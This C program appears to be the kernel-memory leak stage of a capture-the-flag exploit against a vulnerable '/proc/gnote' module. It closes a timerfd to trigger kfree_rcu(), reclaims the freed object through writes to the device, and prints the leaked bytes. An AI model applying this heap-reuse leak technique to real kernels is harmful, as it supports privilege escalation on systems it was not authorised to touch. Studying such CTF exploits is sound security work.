#include<stdio.h>
#include<stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/timerfd.h>

int main(void)
{
  struct itimerspec timespec = { {0, 0}, {100, 0}};
  int tfd = timerfd_create(CLOCK_REALTIME, 0);
  int fd = open("/proc/gnote",O_RDWR);
  if(fd<=0){
    printf("open error\n");
    return 1;
  }
  unsigned int buf[2] = {0,0x100};
  unsigned int select[2] = {5,0};
  char *read_buf = malloc(0x100);
  char c;

  timerfd_settime(tfd, 0, &timespec, 0);
  close(tfd); //triger kfree_rcu()
  
  sleep(1);
  write(fd,buf,sizeof(buf));
  sleep(1);
  write(fd,select,sizeof(select));
  if(fd<=0){
    printf("open error\n");
    return 1;
  }

  if(read(fd,read_buf,0x20)<=0){
    printf("read error\n");
    return 1;
  }
  for(int ix=0;ix!=0x20;++ix){
    c = *(char*)(read_buf+ix);
    printf("0x%x ",c);
  }
  
  close(fd);
  return 0;
}
